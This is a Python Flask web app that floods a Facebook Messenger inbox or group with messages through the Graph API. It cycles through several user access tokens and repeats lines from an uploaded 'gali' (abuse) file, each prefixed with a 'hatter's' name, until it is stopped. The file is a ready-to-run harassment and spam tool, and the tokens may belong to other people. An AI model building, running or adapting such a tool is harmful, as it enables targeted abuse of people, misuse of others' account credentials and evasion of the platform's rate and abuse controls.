from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>W0LF XD HERE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/VYhvZYV6/FB-IMG-1755494001217.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      color: white;
    }
    .container {
      max-width: 350px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px white;
      background-color: rgba(0, 0, 0, 0.5);
    }
    .form-control {
      border: 1px double white;
      background: transparent;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: rgba(255, 255, 255, 0.6);
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">➳ᴏᴡɴᴇʀ ᴡᴏʟғ ✘ᴅ ʜᴇʀᴇ☜⏎</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">➣sᴇʟᴇᴄᴛ ᴛᴏᴋᴇɴ ᴏᴘᴛɪᴏɴ ⏎</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">➳sɪɴɢʟᴇ ᴛᴏᴋᴇɴ☜</option>
          <option value="multiple">➳ᴛᴏᴋᴇɴ ғɪʟᴇ☜</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">➳ᴇɴᴛᴇʀ sɪɴɢʟᴇ ᴛᴏᴋᴇɴ ☟</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">➳ᴄʜᴏᴏsᴇ ᴛᴏᴋᴇɴ ғɪʟᴇ ☟</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">➳ᴇɴᴛᴇʀ ɪɴʙᴏx/ɢʀᴏᴜᴘ ᴜɪᴅ ☟</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">➳ᴇɴᴛᴇʀ ʜᴀᴛᴛᴇʀs ɴᴀᴍᴇ ☟</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">➳ᴇɴᴛᴇʀ ᴛɪᴍᴇ sᴇᴄᴏɴᴅs (ᴇxᴀᴍᴘʟᴇ-10) ☟</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">➳ᴄʜᴏᴏsᴇ ɴᴘ ғɪʟᴇ(ɢᴀʟɪ ғɪʟᴇ) ☟</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">ʀᴜɴ☜</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">➳Enter Task ID to Stop ☟</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">sᴛᴏᴘ☜</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 ᴍᴀᴅᴇ ʙʏ ➳ᴏᴡɴᴇʀ ᴡᴏʟғ ✘ᴅ☜⏎</p>
    <p><a href="https://www.facebook.com/share/1Cokw76aEm/">ᴄʟɪᴄᴋ ғᴏʀ ғᴀᴄʙᴏᴏᴋ☜</a></p>
    <div class="mb-3">
      <a href="https://bit.ly/3V3bDbl" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> ᴍsɢ ғᴏʀ ǫᴜᴀʀʏ
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = tokenOption === 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = tokenOption === 'multiple' ? 'block' : 'none';
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
